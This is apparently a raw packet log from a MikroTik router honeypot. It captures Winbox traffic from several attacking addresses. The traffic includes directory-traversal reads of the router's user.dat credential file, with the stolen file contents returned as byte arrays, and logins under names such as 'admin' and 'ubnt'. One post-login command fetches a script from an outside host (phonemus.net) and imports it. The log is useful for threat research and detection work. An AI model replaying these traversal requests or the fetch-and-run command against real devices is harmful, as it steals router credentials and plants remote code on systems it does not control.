49.248.4.171,56521,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[24,52,174,71,141,226,193,62,9,132,213,36,229,210,54,217],Uff0001:[0,11],Uff0002:[13,4]}"
49.248.4.171,52601,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
49.248.4.171,52601,3.0.152.10,8291,"{u2:1209,ufe0001:8,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
49.248.4.171,52601,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[107,34,21,156,131,236,251,226,233,24,92,182,190,59,226,69],Uff0001:[0,11],Uff0002:[13,4]}"
49.248.4.171,52601,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:162,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,77,128,255,243,10,191,55,88,5,159,199,178,147,25,157,147],Uff0001:[0,11],Uff0002:[13,4]}"
147.52.169.113,27495,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:8,uff0008:16646150,sff0009:'item with this name already exists',Uff0001:[0,130],Uff0002:[48,3]}"
147.52.169.113,27495,3.0.152.10,8291,"{u2:302,ufe0001:9,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
147.52.169.113,28868,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,126,125,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,127,103,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
147.52.169.113,28868,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[224,209,239,145,104,121,119,60,157,100,192,120,78,227,68,155],Uff0001:[0,11],Uff0002:[13,4]}"
147.52.169.113,16446,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
147.52.169.113,16446,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[1999]}"
147.52.169.113,16446,3.0.152.10,8291,"{u2:1209,ufe0001:11,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
147.52.169.113,16446,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[164,29,42,28,117,110,222,152,244,177,6,211,94,162,120,131],Uff0001:[0,11],Uff0002:[13,4]}"
147.52.169.113,16446,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:183,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,8,68,27,50,153,242,202,90,20,226,80,8,114,31,84,52],Uff0001:[0,11],Uff0002:[13,4]}"
147.52.169.113,16446,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[2000]}"
198.34.91.200,55066,3.0.152.10,8291,"{u2:1209,ufe0001:12,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
198.34.91.200,55066,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[199,51,20,237,136,187,161,207,188,125,71,212,225,249,111,194],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,205.121.225.23,50572,"{bff0005:1,uff0006:7,uff0007:7,s1:'./.././.././.././.././../rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
205.121.225.23,50572,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:7,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,205.121.225.23,50572,"{bff0005:1,u2:32768,ufe0001:1,uff0006:0,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,445,202.217.182.14,8291,"{b4:1,uff0003:2,uff0006:0,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,189,244,54,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,166.131.193.113,56845,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
166.131.193.113,56845,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,166.131.193.113,56845,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
246.177.216.31,54252,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,0,4,56,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,246.177.216.31,54252,"{bff0005:1,uff0006:7,uff0007:7,s1:'./.././.././.././.././../rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,246.177.216.31,54252,"{bff0005:1,u2:32768,ufe0001:2,uff0006:0,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,147.255.155.124,64058,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
147.255.155.124,64058,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,147.255.155.124,64058,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
147.255.155.124,64058,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,147.255.155.124,64058,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
147.255.155.124,64058,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,147.255.155.124,64058,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
147.255.155.124,62237,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,147.255.155.124,62237,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
147.255.155.124,62237,3.0.152.10,8291,"{u2:1209,ufe0001:2,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,147.255.155.124,62237,"{ufe0001:2,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,147.255.155.124,62237,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
147.255.155.124,62237,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[156,60,188,58,94,219,135,82,231,6,234,113,242,80,145,158],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,147.255.155.124,62237,"{bff0005:1,uff0006:3,uff0007:1,s1:'ubnt',r9:[156,60,188,58,94,219,135,82,231,6,234,113,242,80,145,158],ra:[0,137,179,42,113,147,235,37,204,86,221,61,29,252,163,197,148],Uff0001:[13,4],Uff0002:[0,11]}"
211.94.64.125,36880,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
211.94.64.125,36880,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
42.142.79.114,50942,3.0.152.10,8291,"{u2:302,ufe0001:3,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,42.142.79.114,50942,"{bff0005:1,u2:32768,ufe0001:3,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
124.33.93.59,17762,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,134,116,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,124.33.93.59,17762,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,157.55.200.121,49853,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
157.55.200.121,49853,3.0.152.10,8291,"{u2:302,ufe0001:5,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,157.55.200.121,49853,"{bff0005:1,u2:32768,ufe0001:5,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
157.55.200.121,63417,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,234,249,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,157.55.200.121,63417,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,157.55.200.121,63417,"{ufe0001:6,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,157.55.200.121,63417,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
157.55.200.121,63417,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[64,243,128,57,17,113,82,62,252,116,254,235,135,59,164,206],Uff0001:[0,11],Uff0002:[13,4]}"
157.55.200.121,63417,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[64,243,128,57,17,113,82,62,252,116,254,235,135,59,164,206],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,157.55.200.121,55955,"{bff0005:1,uff0006:3,uff0007:1,s1:'user1',r9:[64,243,128,57,17,113,82,62,252,116,254,235,135,59,164,206],ra:[0,241,106,187,219,211,120,113,167,155,90,146,198,104,44,43,76],Uff0001:[13,4],Uff0002:[0,11]}"
3.0.152.10,8291,157.55.200.121,55955,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
157.55.200.121,55955,3.0.152.10,8291,"{u2:1209,ufe0001:7,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,157.55.200.121,55955,"{ufe0001:7,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,157.55.200.121,55955,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
157.55.200.121,55955,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[54,228,36,223,225,157,113,139,1,119,114,107,227,34,168,142],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,157.55.200.121,55955,"{bff0005:1,uff0006:3,uff0007:1,s1:'admin',r9:[54,228,36,223,225,157,113,139,1,119,114,107,227,34,168,142],ra:[0,126,204,14,62,228,74,230,243,27,252,210,138,106,235,231,64],Uff0001:[13,4],Uff0002:[0,11]}"
157.55.200.121,55955,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:292,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,126,204,14,62,228,74,230,243,27,252,210,138,106,235,231,64],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,157.55.200.121,55955,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:7,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://phonemus.net/poll/17e2ef02-9ac4-4998-b451-fe08946d6f4a mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
3.0.152.10,8291,47.207.125.111,57569,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
47.207.125.111,57569,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,47.207.125.111,57569,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,235.76.142.203,52537,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
235.76.142.203,52537,3.0.152.10,8291,"{u2:1209,ufe0001:1,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,235.76.142.203,52537,"{ufe0001:1,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,235.76.142.203,52537,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
235.76.142.203,52537,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[79,113,118,243,213,82,70,17,71,224,254,162,64,161,92,38],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,235.76.142.203,52537,"{bff0005:1,uff0006:3,uff0007:1,s1:'service',r9:[79,113,118,243,213,82,70,17,71,224,254,162,64,161,92,38],ra:[0,190,51,58,64,111,61,175,242,209,205,113,225,103,26,15,253],Uff0001:[13,4],Uff0002:[0,11]}"
18.166.106.79,53343,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,18.166.106.79,53343,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,124.104.82.183,50457,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
124.104.82.183,50457,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,124.104.82.183,50457,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
